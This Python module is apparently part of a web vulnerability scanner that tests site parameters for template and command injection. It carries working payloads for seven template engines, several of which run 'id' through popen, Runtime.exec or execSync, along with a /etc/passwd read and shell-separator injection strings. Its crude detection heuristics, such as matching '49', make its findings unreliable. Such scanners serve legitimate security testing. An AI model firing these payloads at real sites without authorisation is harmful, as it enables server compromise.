import os
import json
import asyncio
import aiohttp
from urllib.parse import urlparse, urlencode
from logger import get_logger

logger = get_logger(__name__)

class TemplateScanner:
    def __init__(self):
        self.results_dir = "template_results"
        os.makedirs(self.results_dir, exist_ok=True)
        self.payloads = {
            'Jinja2': [
                "{{7*7}}",
                "{{config}}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
            ],
            'Twig': [
                "{{7*7}}",
                "{{dump(app)}}",
                "{{app.request.server.all|join(',')}}",
                "{{_self.env.setCache(\"php://filter/read=convert.base64-encode/resource=index.php\")}}"
            ],
            'FreeMarker': [
                "${7*7}",
                "<#list .data_model?keys as key>${key}</#list>",
                "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
            ],
            'Velocity': [
                "#set($x = 7*7)${x}",
                "#set($e=\"e\");$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")"
            ],
            'Handlebars': [
                "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push \"constructor\"}}{{this.pop}}{{#with string}}{{this.sub \"constructor\" }}{{#with conslist}}{{this.pop}}{{this.push \"return require('child_process').execSync('id')\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 this)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}"
            ],
            'Django': [
                "{{ 7*7 }}",
                "{% debug %}",
                "{% load module %}",
                "{% include request.GET.template %}"
            ],
            'ERB': [
                "<%= 7*7 %>",
                "<%= system('id') %>",
                "<%= Dir.entries('/') %>",
                "<%= File.open('/etc/passwd').read %>"
            ]
        }
        
        self.command_injection_payloads = [
            "; id",
            "& id",
            "| id",
            "|| id",
            "` id`",
            "$(id)",
            "> /dev/null"
        ]

    async def scan(self, url, session):
        """
        Main entry point for Template Injection scanning. This method is called from app.py.
        
        Args:
            url (str): The main URL/domain to scan
            session (aiohttp.ClientSession): The session to use for HTTP requests
            
        Returns:
            dict: Results of the Template Injection scan
        """
        try:
            logger.info(f"Starting Template Injection scan for {url}")
            
            # Check if subdomain scan results are available
            from subdomain_scanner import subdomain_scan_results
            
            if subdomain_scan_results and subdomain_scan_results.get("all_urls"):
                # Use URLs from subdomain scan
                urls_to_scan = subdomain_scan_results.get("all_urls", [])
                logger.info(f"Using {len(urls_to_scan)} URLs from subdomain scan for Template Injection testing")
            else:
                # Fallback to just the provided URL
                logger.warning("No subdomain scan results available, using only the provided URL")
                urls_to_scan = [url]
            
            # Filter URLs to those with parameters (more likely to be vulnerable to Template Injection)
            param_urls = [u for u in urls_to_scan if '?' in u]
            
            if param_urls:
                logger.info(f"Found {len(param_urls)} URLs with parameters for Template Injection testing")
                # Limit to 20 URLs for performance
                scan_results = await self.scan_urls(param_urls[:20])
            else:
                logger.warning("No URLs with parameters found for Template Injection testing")
                scan_results = {}
            
            # Format the results
            vulnerabilities = []
            for url, result in scan_results.items():
                if result and result.get('is_vulnerable'):
                    for vuln in result.get('vulnerabilities', []):
                        vulnerabilities.append({
                            'url': url,
                            'type': vuln.get('type', 'Template Injection'),
                            'engine': vuln.get('engine', 'Unknown'),
                            'payload': vuln.get('payload', ''),
                            'injection_point': vuln.get('injection_point', ''),
                            'evidence': vuln.get('evidence', []),
                            'severity': vuln.get('severity', 'High')
                        })
            
            # Get unique recommendations
            recommendations = set()
            for _, result in scan_results.items():
                if result and result.get('is_vulnerable'):
                    recommendations.update(result.get('recommendations', []))
            
            return {
                "template_injection_scan": {
                    "status": "completed",
                    "urls_scanned": len(param_urls[:20]) if param_urls else 0,
                    "vulnerabilities_found": len(vulnerabilities),
                    "vulnerabilities": vulnerabilities,
                    "recommendations": list(recommendations) if vulnerabilities else []
                }
            }
            
        except Exception as e:
            logger.error(f"Error in Template Injection scan: {e}")
            return {
                "template_injection_scan": {
                    "status": "error",
                    "error": str(e)
                }
            }

    async def scan_urls(self, urls):
        """
        Scan multiple URLs for template injection vulnerabilities
        """
        try:
            logger.info(f"Starting Template Injection scan for {len(urls)} URLs")
            results = {}
            
            async with aiohttp.ClientSession() as session:
                for url in urls:
                    result = await self._scan_url(session, url)
                    if result:
                        results[url] = result
            
            return results
        except Exception as e:
            logger.error(f"Error in Template Injection scan: {e}")
            return {}

    async def _scan_url(self, session, url):
        """
        Test a single URL for template injection vulnerabilities
        """
        try:
            vulnerabilities = []
            
            # Test template injection payloads
            for engine, payloads in self.payloads.items():
                for payload in payloads:
                    result = await self._test_template_injection(
                        session, url, payload, engine
                    )
                    if result:
                        vulnerabilities.append(result)
            
            # Test command injection payloads
            for payload in self.command_injection_payloads:
                result = await self._test_command_injection(
                    session, url, payload
                )
                if result:
                    vulnerabilities.append(result)

            if vulnerabilities:
                return {
                    'is_vulnerable': True,
                    'vulnerabilities': vulnerabilities,
                    'recommendations': [
                        "Use template engine security mode",
                        "Implement proper input validation",
                        "Avoid using user input in template contexts",
                        "Use sandboxed template environments",
                        "Implement proper output encoding",
                        "Regular security audits of template usage",
                        "Consider using safer alternatives to templates where possible"
                    ],
                    'risk_level': 'Critical' if any(v['severity'] == 'Critical' for v in vulnerabilities) else 'High'
                }

            return None

        except Exception as e:
            logger.error(f"Error scanning URL {url}: {e}")
            return None

    async def _test_template_injection(self, session, url, payload, engine):
        """
        Test a specific template injection payload
        """
        try:
            # Test in URL parameters
            test_url = self._inject_payload_in_url(url, payload)
            
            async with session.get(
                test_url,
                timeout=10,
                allow_redirects=True
            ) as response:
                content = await response.text()
                
                # Check for successful template injection
                if await self._check_template_injection(content, payload, engine):
                    return {
                        'type': 'Template Injection',
                        'engine': engine,
                        'payload': payload,
                        'injection_point': 'URL Parameter',
                        'evidence': await self._extract_evidence(content),
                        'severity': 'Critical'
                    }
            
            # Test in POST data
            async with session.post(
                url,
                data={'param': payload},
                timeout=10,
                allow_redirects=True
            ) as response:
                content = await response.text()
                
                if await self._check_template_injection(content, payload, engine):
                    return {
                        'type': 'Template Injection',
                        'engine': engine,
                        'payload': payload,
                        'injection_point': 'POST Data',
                        'evidence': await self._extract_evidence(content),
                        'severity': 'Critical'
                    }
            
            return None

        except Exception as e:
            logger.error(f"Error testing template injection payload: {e}")
            return None

    async def _test_command_injection(self, session, url, payload):
        """
        Test a specific command injection payload
        """
        try:
            test_url = self._inject_payload_in_url(url, payload)
            
            async with session.get(
                test_url,
                timeout=10,
                allow_redirects=True
            ) as response:
                content = await response.text()
                
                # Check for command injection indicators
                if await self._check_command_injection(content):
                    return {
                        'type': 'Command Injection',
                        'payload': payload,
                        'injection_point': 'URL Parameter',
                        'evidence': await self._extract_evidence(content),
                        'severity': 'Critical'
                    }
            
            return None

        except Exception as e:
            logger.error(f"Error testing command injection payload: {e}")
            return None

    def _inject_payload_in_url(self, url, payload):
        """
        Inject payload into URL parameters
        """
        parsed = urlparse(url)
        if parsed.query:
            return f"{url}&template={payload}"
        return f"{url}?template={payload}"

    async def _check_template_injection(self, content, payload, engine):
        """
        Check if template injection was successful
        """
        indicators = {
            'Jinja2': ['49', 'os.', '__builtins__', '__globals__'],
            'Twig': ['49', 'app.', 'server.'],
            'FreeMarker': ['49', '.data_model', 'Execute'],
            'Velocity': ['49', 'java.lang.Runtime'],
            'Handlebars': ['child_process', 'execSync'],
            'Django': ['49', 'debug', 'module'],
            'ERB': ['49', 'system', 'Dir.entries']
        }
        
        # Check for mathematical evaluation
        if '49' in content and '7*7' in payload:
            return True
        
        # Check for engine-specific indicators
        return any(indicator in content for indicator in indicators.get(engine, []))

    async def _check_command_injection(self, content):
        """
        Check if command injection was successful
        """
        indicators = [
            'uid=',
            'gid=',
            'groups=',
            '/bin/bash',
            'root:x:',
            'daemon:x:'
        ]
        
        return any(indicator in content for indicator in indicators)

    async def _extract_evidence(self, content):
        """
        Extract evidence of successful injection
        """
        evidence = []
        
        # Look for sensitive data
        if 'uid=' in content or 'gid=' in content:
            evidence.append("System user information leaked")
        if '__builtins__' in content:
            evidence.append("Python builtins exposed")
        if 'java.lang.Runtime' in content:
            evidence.append("Java runtime information exposed")
        if '/etc/passwd' in content:
            evidence.append("System file access detected")
        if 'child_process' in content:
            evidence.append("Command execution capability detected")
        
        return evidence if evidence else ["Suspicious template evaluation detected"]

    def _validate_response(self, response_content):
        """
        Validate if the response indicates a successful injection
        """
        # Add custom validation logic based on response patterns
        pass
